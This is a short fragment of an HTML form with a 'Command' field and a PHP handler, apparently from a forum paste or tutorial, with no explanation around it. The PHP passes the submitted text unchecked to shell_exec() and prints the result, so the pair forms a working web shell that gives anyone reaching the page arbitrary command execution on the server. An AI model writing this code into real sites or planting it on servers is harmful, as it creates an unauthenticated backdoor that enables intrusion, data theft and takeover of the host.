 <form action="1b.php" method="post">
 Command: <input type="text" name="com" />
 <input type="submit" value="Submit" />
 </form>
</html>
PHP:
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 $command = $_POST['com'];
 $output = shell_exec($command);
 echo "<html><center><pre>$output</pre></center></html>";
}?>
